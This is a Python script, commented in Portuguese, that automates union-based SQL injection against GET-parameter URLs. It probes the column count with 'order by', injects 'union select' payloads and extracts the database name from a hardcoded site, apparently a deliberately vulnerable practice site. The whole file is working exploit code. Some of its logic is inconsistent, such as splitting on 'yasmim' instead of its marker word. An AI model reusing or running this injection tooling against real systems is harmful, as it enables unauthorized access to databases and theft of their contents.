import requests
from icecream import ic


WORD = "WORD"
DATABASE = "database()"

url_global = None
url_global = "http://www.bancocn.com/cat.php?id=1"
#url_global = "http://testphp.vulnweb.com/listproducts.php?cat=1"

def url():
    
    global url_global
    url_global = input("Qual a url: ")
    
    if '=' in url_global:
        print("Começando o Scanning.")
    else:
        print("Verifique se a URL contem o motedo GET.")
        exit()

## FUNCAO QUE DEFINE A QUANTIDADE DE COLUNAS NECESSARIAS
def order_by():
    i = 1
    request_content_len_order_by = 0
    value = 0
    executed = False
    
    response = requests.get(url_global + "%20order%20by%200")
    request_content = response.content 
    request_content_len = len(request_content)
    #print(f"Request 0: {request_content_len}" )
    
    while request_content_len != request_content_len_order_by:
        response_order_by = requests.get(url_global + f"%20order%20by%20{i}")
        #response_order_by = requests.get(url_global + f"'%20order%20by%20{i}--'")
        request_content_order_by = response_order_by.content
        request_content_len_order_by = len(request_content_order_by)
        #print(f"request {i}: {request_content_len_order_by}")
        if not executed:
            value = request_content_len_order_by
            executed = True
            pass
        if value != request_content_len_order_by:
            break
        else:
            i += 1
        
    return i - 1
        
## FUNCAO QUE CRIA A STRING PARA O UNION SELECT
def columns_order_by():
    select = [str(i) for i in range(1, order_by())]
    clean_select = ",".join(select) + ","
    union_select_url = f"-1%20union%20select%20{clean_select}"
    return union_select_url

def url_maker():
    url = url_global
    last_equal_index = url.rfind("=")
    if last_equal_index != -1:
        url = url[:last_equal_index + 1]  # Adiciona 1 para incluir o caractere "="
    url = url + columns_order_by()
    return url
    

## FUNCAO QUE PEGAR O HTML CONTENT INTEIRO DO INJECTION
def get_response_query():
    
    url_global = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,'{WORD}'"

    
    response = requests.get(url_global)
    if response.status_code == 200:
            request_content = response.content 
            request_content_len = len(request_content)
            return request_content.decode('utf-8', errors='ignore')# Decodificar os bytes para uma string UTF-8
    else:
        return ""

## FUNCAO QUE PEGA A LINHA QUE ESTA A "WORD"
def find_line():
    
    linhas = get_response_query().split('\n')
    for i, linha in enumerate(linhas, start=1):
        if WORD in linha:
            return i
    return None

## FUNCAO QUE PEGA A SOMENTE A "WORD" SUJA
def find_word():
    linha = get_response_query().splitlines()[find_line() - 1]
    return linha

## FUNCAO QUE PEGA <ANTES> E <DEPOIS> DA WORD
def trash_content():
    lines = get_response_query().splitlines()
    if 1 <= find_line() <= len(lines):
        conteudo = lines[find_line() - 1]
        partes = conteudo.split("yasmim")
        return partes
    else:
        return None

## FUNCAO QUE INJETA O DATABASE() E RETORNA O HTML CONTENT INTEIRO DO INJECTION
def get_database():
    URL = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,{DATABASE}"
    
    response = requests.get(URL)
    if response.status_code == 200:
            request_content = response.content 
            request_content_len = len(request_content)
            return request_content.decode('utf-8', errors='ignore') # Decodificar os bytes para uma string UTF-8
    else:
        return ""

## FUNCAO QUE ACHA SOMENTE O DATABASE() SUJO
def find_database():
    lines = get_database().splitlines()
    if 1 <= find_line() <= len(lines):
        return lines[find_line() - 1]
    else:
        return None  # Retorna None se o número da linha estiver fora do alcance
    
    
##  FUNCAO QUE LIMPA A STRING DO "DATABASE()"
def clean_database():
    dbname = find_database()
    for content in trash_content():
        dbname = dbname.replace(content, '')
    return dbname




#url()

#reflected_column = order_by() ## --> RETORNA A QUANTIDADE DE TABLES
#print(reflected_column)

#union_select = columns_order_by() ## RETORNA A STRING COM A COLUNA VULNERAVEL
#print (union_select)

#url_injectable = url_maker()
#print (url_injectable)

#html_word_content = get_response_query()  ## --> RETORNA HTML INTEIRO COM A "WORD"
#print (html_word_content)

#reflected_line = find_line() ## --> RETORNA NUMERO DA LINHA EM QUE A "WORD" ESTA INSERIDA
#print (f"Linha refletida: {reflected_line}")

#dirty_word = find_word()  ## --> RETORNA A "WORD" SUJA
#print (f"Linha word suja: {dirty_word}")

#trash_list = trash_content()    ## --> RETORNA UMA LISTA C/ O CONTEUDO QUE DEVERA SER RETIRADO
#print (f"Lista com contudo que sera tirado {trash_list}")

#html_database_content = get_database() ## --> RETORNA O HTML INTEIRO COM O "DATABASE()"
#print (html_database_content)

#dirty_database = find_database() ## --> RETORNA O "DATABASE()" SUJO
#print (f"Database sujo: {dirty_database}")

dbname = clean_database() ## --> RETORNA O DBNAME JA TRATADO
print (f"Database limpo: {dbname}")

